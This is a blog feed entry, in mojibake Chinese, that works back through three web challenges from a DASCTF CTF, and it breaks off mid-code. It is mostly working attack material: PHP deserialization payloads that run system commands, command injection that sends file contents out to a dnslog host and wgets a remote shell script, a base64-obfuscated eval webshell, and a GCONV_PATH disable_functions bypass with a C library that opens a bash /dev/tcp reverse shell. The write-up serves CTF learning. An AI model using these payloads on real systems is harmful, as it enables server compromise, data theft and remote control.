    
    
    <entry>
      <title>dasctfä¸‰æœˆèµ›å¤ç°</title>
      <link href="/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>æ„Ÿè§‰è¿™æ¬¡çš„é¢˜ä¸æ˜¯å¾ˆéš¾ï¼Œä¸è‡³äºåƒä¹‹å‰é‚£æ ·å¤ç°éƒ½å¤ç°ä¸äº†ï¼Œä¸è¿‡è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œwebåªå‡ºäº†ä¸€ä¸ªï¼Œè¿™é‡Œä¸»è¦æ˜¯å¤ç°ä¸€ä¸‹webæ–¹é¢</p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>ç¡®å®æ˜¯ä¸€ä¸ªç®€å•çš„php</p><pre class="language-none"><code class="language-none">&lt;?phpclass crow&#123;    public $v1;    public $v2;    function eval() &#123;        echo new $this-&gt;v1($this-&gt;v2);    &#125;    public function __invoke()    &#123;        $this-&gt;v1-&gt;world();    &#125;&#125;class fin&#123;    public $f1;    public function __destruct()&#x2F;&#x2F;ååºåˆ—åŒ–çš„å…¥å£    &#123;        echo $this-&gt;f1 . &#39;114514&#39;;    &#125;    public function run()    &#123;        ($this-&gt;f1)();    &#125;    public function __call($a, $b)    &#123;        echo $this-&gt;f1-&gt;get_flag();    &#125;&#125;class what&#123;    public $a;    public function __toString()    &#123;        $this-&gt;a-&gt;run();        return &#39;hello&#39;;    &#125;&#125;class mix&#123;    public $m1;    public function run()    &#123;        ($this-&gt;m1)();    &#125;    public function get_flag()    &#123;        eval(&#39;#&#39; . $this-&gt;m1);    &#125;&#125;if (isset($_POST[&#39;cmd&#39;])) &#123;    unserialize($_POST[&#39;cmd&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>å®Œæ•´çš„ååºåˆ—åŒ–é“¾ä¸º</p><pre class="language-none"><code class="language-none">fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag</code></pre><p>åœ¨get_flagå‡½æ•°é‡Œå¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦æ¥é˜²æ­¢è‡ªå·±çš„å‘½ä»¤è¢«å…¶ä¸­çš„äº•å·æ³¨é‡Šï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p><pre class="language-none"><code class="language-none">class crow&#123;    public $v1;    public $v2;&#125;class fin&#123;    public $f1;&#125;class what&#123;    public $a;&#125;class mix&#123;    public $m1;    public function get_flag()    &#123;        eval(&#39;#&#39; . $this-&gt;m1);    &#125;&#125;$a &#x3D; new fin();$a -&gt;f1 &#x3D; new what();$a -&gt;f1-&gt;a &#x3D; new mix();$a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix();$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;;echo serialize($a);&#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;</code></pre><p>å› ä¸ºæˆ‘è¿™é‡Œæ˜¯ç”¨çš„%0aï¼Œåº”è¯¥æ˜¯è§£æçš„æ—¶å€™æŠŠå®ƒå˜æˆäº†\nï¼Œæ‰€ä»¥è¿™ä¸ªå€¼çš„é•¿åº¦å…¶å®æ˜¯è¦æ¯”ååºåˆ—åŒ–å‡ºçš„é•¿åº¦è¦å°‘1</p><p>æœ€ç»ˆpayloadï¼š</p><pre class="language-none"><code class="language-none">O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;ç„¶åcatè¯»æ–‡ä»¶O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330135920958.png"></p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>app.py</p><pre class="language-none"><code class="language-none">#coding&#x3D;utf-8from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directoryimport randomfrom urllib import parseimport osfrom werkzeug.utils import secure_filenameimport timeapp&#x3D;Flask(__name__)def waf(s):    blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]    flag &#x3D; True    for no in blacklist:        if no.lower() in s.lower():            flag&#x3D; False            print(no)            break    return flag    @app.route(&quot;&#x2F;&quot;)def index():    &quot;æ¬¢è¿æ¥åˆ°SUctf2022&quot;    return render_template(&quot;index.html&quot;)@app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;])def calc():    ip &#x3D; request.remote_addr    num &#x3D; request.values.get(&quot;num&quot;)    log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)        if waf(num):        try:            data &#x3D; eval(num)            os.system(log)        except:            pass        return str(data)    else:        return &quot;waf!!&quot;    if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000)  </code></pre><p>å¯¹è¾“å…¥çš„å†…å®¹å…ˆå½“ä½œpythonè¯­å¥æ‰§è¡Œï¼Œç„¶åå†æ‰§è¡Œlog</p><p>æ¯”èµ›çš„æ—¶å€™æƒ³çš„æ˜¯ç»•è¿‡ç„¶åsstiæ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤çš„å®åœ¨å¤ªå¤šäº†</p><p>æ‰€ä»¥åªèƒ½æ”¾å¼ƒsstiæ¥æƒ³å¯¹os.systemçš„åˆ©ç”¨</p><p>å› ä¸ºlog = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</p><p>ä¹Ÿå°±æ˜¯è¯´å®ƒä¼šæŠŠè¿™äº›å†…å®¹è¾“å‡ºå­˜åˆ°log.txté‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330140603838.png" alt="image-20220330140603838"></p><p>æœ¬åœ°å°è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œå¦‚æœecho é‡Œç”¨åå¼•å·åŠ å‘½ä»¤æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œè€Œæ‰§è¡Œçš„ç»“æœä¼šè¾“å…¥åˆ°log.txtä¸­</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥å°†</p><pre class="language-none"><code class="language-none">num&#x3D;&#96;ls&#96;</code></pre><p>è¾“å…¥ï¼Œå°±ä¼šå¯¼è‡´å‰è¾¹çš„evalå‡½æ•°æŠ¥é”™ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œåé¢çš„systemäº†ã€‚æ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬å°±è¦åˆ©ç”¨äº•å·æ¥è¿›è¡Œæ³¨é‡Š</p><p>#å†pythonä¸­ä½œä¸ºæ³¨é‡Šç¬¦æ¥ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨Linuxä¸­åªæœ‰åœ¨å¥é¦–çš„ä½ç½®æ‰èƒ½å½“ä½œæ³¨é‡Š</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥å®ç°å¯¹evalçš„ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330150930650.png" alt="image-20220330150930650"></p><p>#å°†åè¾¹çš„å€¼éƒ½æ³¨é‡Šäº†ï¼Œä¹Ÿå°±ä¸ä¼šè®©evalæŠ¥é”™äº†</p><p>è€Œå¯¹äºLinux</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330151054801.png" alt="image-20220330151054801"></p><p>æ—¢ç„¶äº•å·å¯ä»¥ç»•è¿‡evalæ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å†è¯•è¯•èƒ½ä¸èƒ½åˆ©ç”¨é€šé…ç¬¦ç›´æ¥è¯»flagï¼ˆè¿™é‡Œå…¶å®åº”è¯¥å…ˆå¤–å¸¦log.txtçš„å†…å®¹çœ‹flagåœ¨çš„æ–‡ä»¶åçš„ï¼Œä½†æ˜¯å¤ç°çš„æ—¶å€™å¿˜äº†</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\&#96;cat%09*1*\&#96;.locsor.dnslog.cn&#96;</code></pre><p>æˆåŠŸäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330144115215.png" alt="image-20220330144115215"></p><p>ä½†æ˜¯æ˜¾ç„¶å› ä¸ºdnslogä¸€æ¬¡åªèƒ½å¸¦ä¸€æ¡ä¿¡æ¯ï¼Œè€Œ|åˆè¢«banæ‰äº†ï¼Œä¸èƒ½åˆ©ç”¨sedæ¥çœ‹å…¶ä»–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥çŒœåˆ°flagçš„éš¾åº¦å¾ˆå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨wgetæ¥è®©é¶æœºåå¼¹shell</p><p>1.shå°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„åå¼¹shellçš„è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;ip&#x2F;1.sh&#96;</code></pre><p>ç»™ä¸€ä¸ªå¯æ‰§è¡Œæƒé™</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; </code></pre><p>ç„¶åæ‰§è¡Œ</p><pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145346259.png" alt="image-20220330145346259"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145646941.png" alt="image-20220330145646941"></p><p>æ‹¿åˆ°flagï¼Œå’Œdnslogå¤–å¸¦çš„ç»“æœä¸€æ ·</p><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>åªèƒ½ä¼ phpï¼Œä½†æ˜¯ä¼ phpåˆä¼šè¢«è¿‡æ»¤</p><p>è¿™é‡ŒæŠŠContent-Typeæ”¹æˆimage/jpegå°±èƒ½ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212538985.png" alt="image-20220330212538985"></p><p>evalåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä¼ é©¬ä¼ ä¸ä¸Šå»ï¼Œå¯ä»¥å…ˆä¼ ä¸ªphpinfo()çœ‹çœ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212709209.png" alt="image-20220330212709209"></p><p>ç¬¬ä¸€æ¬¡è§è¿™ä¹ˆå¤šçš„disable_functions</p><p>ä½†æ˜¯show_sourceï¼Œfile_get_contentsæ²¡è¢«banï¼Œå¯ä»¥ç”¨è¿™ä¸ªè¯»å–æºç </p><pre class="language-none"><code class="language-none">&lt;?php(&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;è¿™é‡Œæ‹¼æ¥ç»•è¿‡æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯è¢«æ”¾äº†é»‘åå•é‡Œäº†?&gt;</code></pre><p>index.php</p><pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKServer: openrestyDate: Sat, 26 Mar 2022 09:01:18 GMTContent-Type: text&#x2F;html; charset&#x3D;UTF-8Content-Length: 1695Connection: closeVary: Accept-Encoding&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;    å˜¿ä¼™è®¡ï¼Œä¼ ä¸ªç«ï¼Ÿï¼    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;&lt;?phpfunction fun($var): bool&#123;    $blacklist &#x3D; [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;];    foreach($blacklist as $blackword)&#123;        if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstrå¤§å°å†™æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¤§å†™ç»•è¿‡è¿™ä¸ªé»‘åå•    &#125;        return False;&#125;error_reporting(0);&#x2F;&#x2F;è®¾ç½®ä¸Šä¼ ç›®å½•define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;);$msg &#x3D; &quot;Upload Success!&quot;;if (isset($_POST[&#39;submit&#39;])) &#123;$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123;die(&quot;åªè¦å¥½çœ‹çš„php&quot;);&#125;$content &#x3D; file_get_contents($temp_file);if(fun($content))&#123;    die(&quot;è¯¶ï¼Œè¢«æˆ‘å‘ç°äº†å§&quot;);&#125;$new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext;        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;        if (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload &#x3D; true;        &#125; else &#123;            $msg &#x3D; &#39;Upload Failed!&#39;;            die();        &#125;        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;&#125;</code></pre><p>æ—¢ç„¶è¦ç»•è¿‡disable_functions,æˆ‘ä»¬å°±è¦æƒ³åˆ°åˆ©ç”¨soæ–‡ä»¶</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">ä½¿ç”¨GCONV_PATHä¸iconvè¿›è¡Œbypass disable_functions_lesion__çš„åšå®¢-CSDNåšå®¢</a></p><p>ä½†æ˜¯åœ¨soæ–‡ä»¶ä¸­æœ‰äº›ç¬¦å·ä¼šè¢«è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢çš„é»‘åå•è¿‡æ»¤</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦é‡‡ç”¨è‡ªå·±å†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ— é»‘åå•çš„é¡µé¢æ¥ç»•è¿‡</p><p>1.php</p><pre class="language-none"><code class="language-none">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0Kbase64è§£ç åå®é™…çš„å†…å®¹&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;    å˜¿ä¼™è®¡ï¼Œä¼ ä¸ªç«ï¼Ÿï¼    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;&lt;?phperror_reporting(0);&#x2F;&#x2F;è®¾ç½®ä¸Šä¼ ç›®å½•define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;);$msg &#x3D; &quot;Upload Success!&quot;;if (isset($_POST[&#39;submit&#39;])) &#123;$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);&#x2F;&#x2F;xxxxx$content &#x3D; file_get_contents($temp_file);$new_file_name &#x3D; $file_name;        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;        if (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload &#x3D; true;        &#125; else &#123;            $msg &#x3D; &#39;Upload Failed!&#39;;            die();        &#125;        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;&#125;</code></pre><p>åŒæ—¶æˆ‘ä»¬è¿˜è¦ä¸²ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œä½¿è¿™æ®µbase64åŠ å¯†çš„ä¸œè¥¿å¯ä»¥è¢«è§£æ</p><pre class="language-none"><code class="language-none">&lt;?phpEval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;æ³¨æ„evalé‡Œçš„åˆ†å·æ˜¯è¦æ‹¼æ¥ä¸Šå»ï¼Œè€Œä¸æ˜¯ç›´æ¥åŠ ä¸Š?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195013802.png" alt="image-20220331195013802"></p><p>//å®é™…ä¸Šè¿™é‡Œåšé¢˜çš„æ—¶å€™ç»å¸¸æŠ¥é”™ï¼Œä½†æ˜¯ç”¨getæ–¹æ³•å–å€¼å°±æ²¡é—®é¢˜,æ‰€ä»¥æˆ‘ä¸‹é¢éƒ½ç”¨çš„getçš„ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202127030.png" alt="image-20220331202127030"></p><p>å†åˆ©ç”¨includeå’Œphp://filteræ¥è®©ä¹‹å‰æˆ‘ä»¬å†™çš„é¡µé¢çš„ä»£ç æ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195651892.png" alt="image-20220331195651892"></p><pre class="language-none"><code class="language-none">a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;));é‡Œé¢è¿™æ®µbase64åŠ å¯†çš„å†…å®¹æ˜¯php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php</code></pre><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®<a href="https://blog.csdn.net/qq_42303523/article/details/117911859">ä½¿ç”¨GCONV_PATHä¸iconvè¿›è¡Œbypass disable_functions_lesion__çš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™ç¯‡æ–‡ç« é‡Œçš„ä¸œè¥¿è¿›è¡Œæäº¤äº†</p><p>é¦–å…ˆæ˜¯gconv-modulesæ–‡ä»¶</p><pre class="language-none"><code class="language-none">module  è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2module  INTERNAL    è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2æ ¹æ®é¢˜ç›®æˆ‘ä»¬å¯ä»¥æ”¹æˆaamodule  A&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2module  INTERNAL    A&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202853421.png" alt="image-20220331202853421"></p><p>ç„¶åæ˜¯soæ–‡ä»¶</p><pre class="language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123;  system(&quot;å¸Œæœ›æ‰§è¡Œçš„å‘½ä»¤&quot;);&#125;æˆ‘ä»¬å¯ä»¥å†™æˆ#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123;  system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;);&#125;</code></pre><p>ç„¶åç¼–è¯‘</p><pre class="language-none"><code class="language-none">gcc æºä»£ç æ–‡ä»¶å.c -o è‡ªå®šä¹‰å­—ç¬¦é›†å.so -shared -fPIC</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203826312.png" alt="image-20220331203826312"></p><p>ä¸Šä¼ </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203859731.png" alt="image-20220331203859731"></p><p>ç„¶åä¹¦å†™shell.php</p><pre class="language-none"><code class="language-none">&lt;?php    putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);    